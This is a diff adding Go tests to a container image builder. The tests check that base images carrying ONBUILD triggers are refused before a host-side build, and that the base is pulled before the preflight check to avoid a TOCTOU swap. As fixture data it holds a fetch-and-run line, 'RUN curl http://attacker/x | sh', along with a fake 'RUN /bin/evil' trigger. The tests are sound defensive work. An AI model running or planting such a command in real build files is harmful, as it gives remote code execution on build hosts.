@@ -97,6 +97,82 @@ func TestFinalizeBase_FailsClosedOnBuildError(t *testing.T) {
 	}
 }
 
+// A hostile BYOI base carrying ONBUILD triggers must be REFUSED, not wrapped:
+// the wrap build runs on the host daemon outside every confinement tier, so its
+// FROM would fire the triggers as host-side build-time RCE. This is the
+// wrap-only guarantee.
+func TestFinalizeBase_RefusesBaseWithOnBuildTriggers(t *testing.T) {
+	f := newFakeEnvbuilderDocker()
+	f.imagesPresent["evil/base:latest"] = true
+	f.onBuild = map[string][]string{
+		"evil/base:latest": {"RUN curl http://attacker/x | sh", "COPY . /"},
+	}
+	b := newWithClient(f, "envbuilder:test", "")
+	b.ToolsDir = toolsDirWithRequired(t)
+
+	_, err := b.FinalizeBase(context.Background(), "evil/base:latest", "wardyn-byoi/run-5:latest")
+	if err == nil {
+		t.Fatal("expected FinalizeBase to refuse a base carrying ONBUILD triggers")
+	}
+	if !strings.Contains(err.Error(), "ONBUILD") {
+		t.Fatalf("error should name ONBUILD, got: %v", err)
+	}
+	// Fail CLOSED: the wrap build must never start, or the triggers already ran.
+	if f.imageBuildCalled {
+		t.Fatal("wrap ImageBuild ran despite ONBUILD triggers — the triggers would have executed on the host")
+	}
+}
+
+// The devcontainer path wraps an envbuilder-pushed base built from an untrusted
+// repo, so it must get the same ONBUILD refusal as BYOI.
+func TestBuild_RefusesPushedBaseWithOnBuildTriggers(t *testing.T) {
+	f := newFakeEnvbuilderDocker()
+	f.onBuild = map[string][]string{"reg.example.com/cache": {"RUN /bin/evil"}}
+	b := newWithClient(f, "envbuilder:test", "reg.example.com/cache")
+	b.ToolsDir = toolsDirWithRequired(t)
+
+	_, err := b.Build(context.Background(), BuildSpec{
+		RepoURL:        "https://example.com/repo.git",
+		OutputImageTag: "wardyn-env/run-6:latest",
+	})
+	if err == nil {
+		t.Fatal("expected Build to refuse a pushed base carrying ONBUILD triggers")
+	}
+	if !strings.Contains(err.Error(), "ONBUILD") {
+		t.Fatalf("error should name ONBUILD, got: %v", err)
+	}
+	if f.imageBuildCalled {
+		t.Fatal("finalize ImageBuild ran despite ONBUILD triggers on the pushed base")
+	}
+}
+
+// The devcontainer path must still pull the freshly pushed base, but it has to
+// do so BEFORE the ONBUILD preflight and then build from that exact local image.
+// Leaving the pull to the daemon (PullParent) would re-resolve the FROM after
+// the check, so a mutable cache-repo tag could swap underneath it (TOCTOU).
+func TestBuild_PullsBaseItselfSoTheDaemonCannotRePullPastThePreflight(t *testing.T) {
+	f := newFakeEnvbuilderDocker()
+	b := newWithClient(f, "envbuilder:test", "reg.example.com/cache")
+	b.ToolsDir = toolsDirWithRequired(t)
+
+	if _, err := b.Build(context.Background(), BuildSpec{
+		RepoURL:        "https://example.com/repo.git",
+		OutputImageTag: "wardyn-env/run-7:latest",
+	}); err != nil {
+		t.Fatalf("Build: %v", err)
+	}
+	// The pushed base is still fetched fresh — the check must not cost freshness.
+	if !f.pulled("reg.example.com/cache") {
+		t.Fatal("finalize did not pull the freshly pushed base")
+	}
+	if f.lastBuildPullParent {
+		t.Fatal("wrap build set PullParent: the daemon could resolve a base the ONBUILD preflight never saw")
+	}
+	if len(f.inspected) == 0 || f.inspected[0] != "reg.example.com/cache" {
+		t.Fatalf("wrap did not inspect the base it builds FROM, inspected=%v", f.inspected)
+	}
+}
+
 func TestFinalizeBase_FailsWhenToolsDirMissing(t *testing.T) {
 	f := newFakeEnvbuilderDocker()
 	b := newWithClient(f, "envbuilder:test", "")
